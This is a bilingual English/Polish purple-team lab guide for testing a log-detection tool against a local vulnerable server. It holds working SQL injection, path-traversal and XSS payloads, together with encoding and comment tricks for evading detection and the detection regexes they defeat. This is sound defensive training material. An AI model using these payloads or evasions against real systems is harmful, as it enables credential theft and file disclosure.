# Homelab Purple Team Scenarios & Evasion Exercises

[English](#english) | [Polski](#polski)

---

<a name="english"></a>
## English Version

This guide outlines a series of practical **Purple Teaming** exercises: attack simulation (Red Team) and testing/bypassing detection engines (Blue Team / `log-sentry`).

---

### The Purple Teaming Feedback Loop

```text
 ┌──────────────┐       ┌──────────────┐       ┌──────────────┐
 │   RED TEAM   │ ----> │    TARGET    │ ----> │  BLUE TEAM   │
 │ Sends attack │       │ Writes       │       │ Log analysis │
 │ payload      │       │ access.log   │       │ (log-sentry) │
 └──────────────┘       └──────────────┘       └──────┬───────┘
        ▲                                             │
        │             Evasion / Bypass Attempt        │
        └─────────────────────────────────────────────┘
```

---

### Scenario 1: SQL Injection (SQLi)

#### 1.1 Standard (Blatant) Attack
The attacker attempts to extract database tables using a standard `UNION SELECT` clause:
```bash
curl "http://localhost:8080/products?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users"
```
* **Application Result**: The vulnerable endpoint returns the dumped database content (the `users` table).
* **Detection in `log-sentry`**: `[DETECTED]` (matched by the `union.*select` rule).

#### 1.2 Evasion Technique (Inline Comments)
In database engines such as MySQL/SQLite, `/**/` comments act like whitespace, but to a naive log analyzer, they break up keywords:
```bash
curl "http://localhost:8080/products?id=1/**/UNION/**/SELECT/**/null,username,password/**/FROM/**/users"
```
* **Application Result**: The database executes the query and returns data.
* **Detection in `log-sentry`**: `[BYPASS]` (depending on regex boundaries, inline comments may defeat simplistic whitespace assumptions).

---

### Scenario 2: Directory Traversal (LFI)

#### 2.1 Standard (Blatant) Attack
The attacker attempts to read `/etc/passwd`:
```bash
curl "http://localhost:8080/download?file=../../../../etc/passwd"
```
* **Application Result**: The application simulates leaking `/etc/passwd`.
* **Detection in `log-sentry`**: `[DETECTED]` (matched by `\.\./` and `/etc/passwd`).

#### 2.2 Evasion Technique (URL Encoding)
The attacker URL-encodes slashes `/` as `%2f` or dots `.` as `%2e`:
```bash
curl "http://localhost:8080/download?file=..%2f..%2f..%2f..%2fetc/passwd"
```
* **Application Result**: The web server / application unquotes the parameter before use, so the file is retrieved.
* **Detection in `log-sentry`**: `[BYPASS]` (if `log-sentry` does not perform `unquote()` prior to pattern matching).

#### 2.3 Advanced Technique: Double URL Encoding
```bash
curl "http://localhost:8080/download?file=%252e%252e%252f%252e%252e%252fetc/passwd"
```
In double URL encoding, the `%` character becomes `%25`. In layered architectures (e.g. reverse proxy + app server), requests may be decoded twice, while an inspection script that only decodes once or inspects raw logs sees only `%252e`.

---

### Scenario 3: Cross-Site Scripting (XSS)

#### 3.1 Standard (Blatant) Attack
Classic script tag injection:
```bash
curl "http://localhost:8080/search?q=<script>alert('pwned')</script>"
```
* **Detection in `log-sentry`**: `[DETECTED]` (matched by the `<script.*?>` signature).

#### 3.2 Evasion Technique (Event Handlers Without Script Tags)
Injecting payloads into graphic or multimedia tags using event handlers:
```bash
curl "http://localhost:8080/search?q=<svg/onload=alert(1)>"
curl "http://localhost:8080/search?q=<body/onpageshow=alert(1)>"
```
* **Detection in `log-sentry`**: `[BYPASS]` (avoids `script` tags and `onerror=` filters; note: if a generic `alert\(` pattern exists, altering the JS payload to other execution sinks achieves full evasion).

---

### Scenario 4: User-Agent Scanner Fingerprinting

Attackers often employ automated reconnaissance tools (`sqlmap`, `nikto`, `gobuster`):
```bash
curl -H "User-Agent: sqlmap/1.7.11#stable (https://sqlmap.org)" "http://localhost:8080/products?id=1"
```
* **Detection Engineering Takeaway**: If `log-sentry` only parses the request `path`, tools like `sqlmap` remain invisible in the logs during their initial profiling phase until an obvious payload is triggered.

---

### How to Run the Exercise

1. Clear existing logs:
   ```bash
   ./lab.sh clean
   ```
2. Start the lab server:
   ```bash
   ./lab.sh start
   ```
3. Run attack scenarios:
   ```bash
   ./lab.sh attack all
   ```
4. Analyze detection coverage:
   ```bash
   ./lab.sh analyze
   ```
5. Review which **EVASION** attacks bypassed detection, then improve the rules in `log-sentry`.

---

<a name="polski"></a>
## Wersja Polska (Polish Version)

Ten przewodnik opisuje serię praktycznych ćwiczeń z zakresu **Purple Teaming**: symulowania ataków (Red Team) oraz testowania i omijania silnika detekcji (Blue Team / `log-sentry`).

---

### Pętla Purple Teaming (The Feedback Loop)

```text
 ┌──────────────┐       ┌──────────────┐       ┌──────────────┐
 │   RED TEAM   │ ----> │    TARGET    │ ----> │  BLUE TEAM   │
 │ Wysłanie     │       │ Zapisanie    │       │ Analiza logu │
 │ ataku        │       │ access.log   │       │ (log-sentry) │
 └──────────────┘       └──────────────┘       └──────┬───────┘
        ▲                                             │
        │             Próba ominięcia (Bypass)        │
        └─────────────────────────────────────────────┘
```

---

### Scenariusz 1: SQL Injection (SQLi)

#### 1.1 Atak standardowy (Jawny)
Atakujący próbuje wyciągnąć tabele bazodanowe za pomocą standardowej klauzuli `UNION SELECT`:
```bash
curl "http://localhost:8080/products?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users"
```
* **Wynik w aplikacji**: Podatny endpoint zwraca zrzuconą zawartość bazy (tablicę `users`).
* **Detekcja w `log-sentry`**: `[WYKRYTO]` (dopasowanie do reguły `union.*select`).

#### 1.2 Technika Ominięcia (Evasion: Inline Comments)
W silnikach takich jak MySQL/SQLite komentarze `/**/` działają jak spacja, ale z punktu widzenia prostego analizatora logów rozbijają słowa kluczowe:
```bash
curl "http://localhost:8080/products?id=1/**/UNION/**/SELECT/**/null,username,password/**/FROM/**/users"
```
* **Wynik w aplikacji**: Baza wykonuje zapytanie i zwraca dane.
* **Detekcja w `log-sentry`**: `[BYPASS]` (w zależności od granic regexa komentarze mogą zmylić prosty wzorzec oczekujący spacji).

---

### Scenariusz 2: Directory Traversal (LFI)

#### 2.1 Atak standardowy (Jawny)
Atakujący próbuje odczytać plik `/etc/passwd`:
```bash
curl "http://localhost:8080/download?file=../../../../etc/passwd"
```
* **Wynik w aplikacji**: Aplikacja symuluje wyciek `/etc/passwd`.
* **Detekcja w `log-sentry`**: `[WYKRYTO]` (dopasowanie do `\.\./` oraz `/etc/passwd`).

#### 2.2 Technika Ominięcia (Evasion: URL Encoding)
Atakujący koduje ukośnik `/` jako `%2f` lub kropkę `.` jako `%2e`:
```bash
curl "http://localhost:8080/download?file=..%2f..%2f..%2f..%2fetc/passwd"
```
* **Wynik w aplikacji**: Serwer WWW / aplikacja przed użyciem parametru dekoduje URL, więc plik zostaje odczytany.
* **Detekcja w `log-sentry`**: `[BYPASS]` (jeśli `log-sentry` nie dekoduje `unquote()` przed przeszukaniem regexem).

#### 2.3 Technika Zaawansowana: Double URL Encoding
```bash
curl "http://localhost:8080/download?file=%252e%252e%252f%252e%252e%252fetc/passwd"
```
W podwójnym kodowaniu znak `%` zamienia się w `%25`. Serwery z wielowarstwowym proxy często dekodują zapytanie dwukrotnie, podczas gdy prosty skrypt analizujący widzi tylko ciąg znaków `%252e`.

---

### Scenariusz 3: Cross-Site Scripting (XSS)

#### 3.1 Atak standardowy (Jawny)
Klasyczne wstrzyknięcie tagu `<script>`:
```bash
curl "http://localhost:8080/search?q=<script>alert('pwned')</script>"
```
* **Detekcja w `log-sentry`**: `[WYKRYTO]` (sygnatura `<script.*?>`).

#### 3.2 Technika Ominięcia (Evasion: Event Handlers bez Script)
Wstrzyknięcie wektora w tagach multimedialnych lub graficznych:
```bash
curl "http://localhost:8080/search?q=<svg/onload=alert(1)>"
curl "http://localhost:8080/search?q=<body/onpageshow=alert(1)>"
```
* **Detekcja w `log-sentry`**: `[BYPASS]` (brak słowa `script` i brak `onerror=`).

---

### Scenariusz 4: Wykrywanie skanerów po User-Agent

Atakujący często korzystają z automatycznych narzędzi (`sqlmap`, `nikto`, `gobuster`):
```bash
curl -H "User-Agent: sqlmap/1.7.11#stable (https://sqlmap.org)" "http://localhost:8080/products?id=1"
```
* **Wniosek do inżynierii detekcji**: Jeśli `log-sentry` analizuje wyłącznie pole `path`, narzędzie takie jak `sqlmap` pozostaje niewidoczne w logach podczas fazy profilowania, dopóki nie wyśle oczywistego payloadu.

---

### Jak przeprowadzić ćwiczenie:

1. Wyczyść logi:
   ```bash
   ./lab.sh clean
   ```
2. Uruchom serwer labu:
   ```bash
   ./lab.sh start
   ```
3. Uruchom scenariusze ataków:
   ```bash
   ./lab.sh attack all
   ```
4. Zbadaj wyniki detekcji:
   ```bash
   ./lab.sh analyze
   ```
5. Przeanalizuj, które ataki z grupy **EVASION** nie zostały wykryte, a następnie ulepsz reguły w `log-sentry`.
